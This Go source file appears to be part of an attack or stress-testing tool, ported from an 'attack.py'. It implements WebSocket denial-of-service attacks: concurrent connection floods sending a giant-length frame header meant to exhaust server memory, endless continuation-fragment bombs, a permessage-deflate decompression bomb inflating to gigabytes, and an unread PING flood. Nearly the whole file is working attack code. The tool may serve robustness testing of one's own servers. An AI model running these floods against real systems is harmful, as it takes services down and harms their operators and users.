package main

// WebSocket attacks (RFC 6455). Port of attack.py's _ws_flood family. Each opens
// N WebSocket connections (handshake to /ws) and runs a body that sends malformed
// or abusive frames. Client frames are masked, as the RFC requires.

import (
	"bytes"
	"compress/flate"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// wsConnect does the RFC 6455 handshake to /ws and returns the live socket after a
// 101, else an error. ext, if set, is offered as Sec-WebSocket-Extensions.
func wsConnect(c *config, ext string) (net.Conn, error) {
	keyb := make([]byte, 16)
	rand.Read(keyb)
	req := fmt.Sprintf("GET /ws HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"+
		"Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n", c.host, base64.StdEncoding.EncodeToString(keyb))
	if ext != "" {
		req += "Sec-WebSocket-Extensions: " + ext + "\r\n"
	}
	req += "\r\n"
	conn, err := dial(c, "http/1.1")
	if err != nil {
		return nil, err
	}
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	var resp []byte
	buf := make([]byte, 4096)
	for !bytes.Contains(resp, []byte("\r\n\r\n")) && len(resp) < 65536 {
		n, err := conn.Read(buf)
		if n > 0 {
			resp = append(resp, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	line := resp
	if i := bytes.Index(resp, []byte("\r\n")); i >= 0 {
		line = resp[:i]
	}
	if !bytes.Contains(line, []byte(" 101")) {
		conn.Close()
		return nil, fmt.Errorf("ws handshake not 101")
	}
	conn.SetReadDeadline(time.Time{}) // clear
	return conn, nil
}

// wsFrame builds a masked client frame (clients MUST mask, RFC 6455 §5.3).
func wsFrame(opcode byte, payload []byte, fin, rsv1 bool) []byte {
	b0 := opcode & 0x0f
	if fin {
		b0 |= 0x80
	}
	if rsv1 {
		b0 |= 0x40
	}
	n := len(payload)
	var head []byte
	switch {
	case n < 126:
		head = []byte{b0, 0x80 | byte(n)}
	case n < 65536:
		head = []byte{b0, 0x80 | 126, byte(n >> 8), byte(n)}
	default:
		head = make([]byte, 10)
		head[0], head[1] = b0, 0x80|127
		binary.BigEndian.PutUint64(head[2:], uint64(n))
	}
	mask := make([]byte, 4)
	rand.Read(mask)
	masked := make([]byte, n)
	for i := 0; i < n; i++ {
		masked[i] = payload[i] ^ mask[i%4]
	}
	return append(append(head, mask...), masked...)
}

// wsFrameHeader builds just a frame header declaring `declaredLen` bytes plus the
// 4-byte mask key — no payload, for the giant-frame pre-allocation probe.
func wsFrameHeader(opcode byte, declaredLen uint64, fin bool) []byte {
	b0 := opcode & 0x0f
	if fin {
		b0 |= 0x80
	}
	var head []byte
	switch {
	case declaredLen < 126:
		head = []byte{b0, 0x80 | byte(declaredLen)}
	case declaredLen < 65536:
		head = []byte{b0, 0x80 | 126, byte(declaredLen >> 8), byte(declaredLen)}
	default:
		head = make([]byte, 10)
		head[0], head[1] = b0, 0x80|127
		binary.BigEndian.PutUint64(head[2:], declaredLen)
	}
	mask := make([]byte, 4)
	rand.Read(mask)
	return append(head, mask...)
}

// wsFlood runs body on N WebSocket connections; body returns reaped (the server
// dropped an established conn) and tallies its own frames/bytes via a counter.
func wsFlood(c *config, st *stats, ext string, body func(conn net.Conn, deadline time.Time) bool) {
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := wsConnect(c, ext)
			if err != nil { // handshake refused / no /ws = connect failure, not a reap
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			defer conn.Close()
			atomic.AddInt64(&st.Established, 1)
			if body(conn, deadline) {
				atomic.AddInt64(&st.Reaped, 1)
			}
		}()
	}
	wg.Wait()
}

// deflateRawBomb: a raw-deflate (permessage-deflate) stream that inflates to
// `size` zeros, with the RFC 7692 sync-flush tail (00 00 ff ff) stripped.
func deflateRawBomb(size int) []byte {
	var buf bytes.Buffer
	w, _ := flate.NewWriter(&buf, 9)
	zeros := make([]byte, 1<<20)
	for rem := size; rem > 0; {
		n := len(zeros)
		if n > rem {
			n = rem
		}
		w.Write(zeros[:n])
		rem -= n
	}
	w.Flush()
	out := buf.Bytes()
	if bytes.HasSuffix(out, []byte{0x00, 0x00, 0xff, 0xff}) {
		out = out[:len(out)-4]
	}
	return out
}

func wsGiantFrame(c *config, st *stats) {
	// A binary frame header declaring a near-2^63 payload, then only 4 bytes: a
	// server that sizes its receive buffer from the declared length OOMs at once.
	hdr := append(wsFrameHeader(0x2, c.wsFrameLen, true), 0, 0, 0, 0)
	wsFlood(c, st, "", func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		conn.SetWriteDeadline(time.Now().Add(writeTO))
		if _, err := conn.Write(hdr); err != nil {
			return !isTimeout(err)
		}
		ct.tally(1, int64(len(hdr)))
		buf := make([]byte, 4096)
		for time.Now().Before(dl) {
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			n, err := conn.Read(buf)
			if err == nil && n == 0 {
				return true // clean close
			}
			if err != nil && !isTimeout(err) {
				return true // reset / EOF
			}
		}
		return false
	})
}

func wsFragmentBomb(c *config, st *stats) {
	// An opening text frame (FIN=0) then endless continuation frames (opcode 0,
	// FIN=0): a server that aggregates fragments with no total cap buffers forever.
	start := wsFrame(0x1, bytes.Repeat([]byte("A"), c.wsFragSize), false, false)
	frag := wsFrame(0x0, bytes.Repeat([]byte("A"), c.wsFragSize), false, false)
	wsFlood(c, st, "", func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		conn.SetWriteDeadline(time.Now().Add(writeTO))
		if _, err := conn.Write(start); err != nil {
			return !isTimeout(err)
		}
		ct.tally(1, int64(len(start)))
		for time.Now().Before(dl) {
			conn.SetWriteDeadline(time.Now().Add(writeTO))
			if _, err := conn.Write(frag); err != nil {
				return !isTimeout(err)
			}
			ct.tally(1, int64(len(frag)))
		}
		return false
	})
}

func wsDeflateBomb(c *config, st *stats) {
	// With permessage-deflate negotiated, one compressed frame (RSV1=1) that
	// inflates to ~GBs: the server inflates before any max-message check.
	frame := wsFrame(0x2, deflateRawBomb(c.bombSize), true, true)
	wsFlood(c, st, "permessage-deflate", func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		buf := make([]byte, 65536)
		for time.Now().Before(dl) {
			conn.SetWriteDeadline(time.Now().Add(writeTO))
			if _, err := conn.Write(frame); err != nil {
				return !isTimeout(err)
			}
			ct.tally(1, int64(len(frame)))
			conn.SetReadDeadline(time.Now().Add(3 * time.Second))
			conn.Read(buf) // drain reply if any; timeout is fine
		}
		return false
	})
}

func wsPongFlood(c *config, st *stats) {
	// Flood PING frames, never reading: a server that auto-replies PONG and ignores
	// write backpressure grows an unbounded outbound queue.
	ping := wsFrame(0x9, []byte("ping"), true, false)
	wsFlood(c, st, "", func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		for time.Now().Before(dl) {
			conn.SetWriteDeadline(time.Now().Add(writeTO))
			if _, err := conn.Write(ping); err != nil {
				return !isTimeout(err)
			}
			ct.tally(1, int64(len(ping)))
		}
		return false
	})
}
